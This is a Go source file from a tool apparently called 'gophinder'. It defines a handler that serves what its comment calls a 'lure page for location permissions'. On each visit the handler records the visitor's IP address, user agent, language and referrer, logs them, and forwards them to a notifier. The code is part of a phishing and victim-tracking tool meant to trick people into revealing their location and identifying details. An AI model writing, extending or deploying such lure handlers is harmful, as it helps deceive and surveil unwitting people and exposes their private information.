package handler

import (
	"html/template"
	"log"
	"net/http"

	"gophinder/internal/logging"
	"gophinder/internal/notifier"
	"gophinder/utils"
)

// handler to server the lure page for location permissions
// : sends basic info to stdout upon visit
func ServeTemplate(templatePath string, notifier notifier.Notifier) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		ip := utils.GetIP(r)
		fields := map[string]string{ // send basic info upon visit
			"IP Address": ip,
			"User-Agent": r.UserAgent(),
			"Language":   r.Header.Get("Accept-Language"),
			"Referer":    r.Referer(),
		}
		logging.LogBlock("Access Log", fields)

		if notifier != nil {
			go notifier.Notify("Location Log", fields)
		}

		tmpl, err := template.ParseFiles(templatePath)
		if err != nil {
			log.Printf("Template error: %v", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		tmpl.Execute(w, nil)
	}
}
